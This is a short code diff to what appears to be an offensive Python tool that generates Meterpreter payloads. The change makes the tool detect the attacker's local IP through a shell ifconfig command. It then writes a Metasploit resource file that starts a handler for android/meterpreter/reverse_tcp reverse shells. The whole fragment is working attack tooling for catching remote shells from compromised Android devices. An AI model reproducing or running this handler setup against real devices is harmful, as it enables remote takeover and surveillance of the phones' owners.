@@ -79,11 +79,14 @@ def generate_meterpreter(command):
         sys.exit(1)
 
 def start_meterpreter_handler():
+    command = "ifconfig wlan0 | grep \"inet \" | awk -F'[: ]+' '{ print $4 }'"
+    proc = subprocess.Popen(command, stdout=subprocess.PIPE,shell=True)
+    (localip, err) = proc.communicate()
+    print "[*] Start the handler for meterpreter on IP: " + str(localip) + " Port: " + args['meterpreter_port']
     with open("meterpreter_options.txt", "w") as f:
         f.write("use exploit/multi/handler\n")
         f.write("set payload android/meterpreter/reverse_tcp\n")
-        # TODO get local ip with: localip = `ifconfig wlan0 | grep "inet " | awk -F'[: ]+' '{ print $4 }'`
-        f.write("set lhost " + args['meterpreter_ip'] + "\n")
+        f.write("set lhost " + str(localip) + "\n")
         f.write("set lport " + args['meterpreter_port'] + "\n")
         f.write("exploit\n")
     
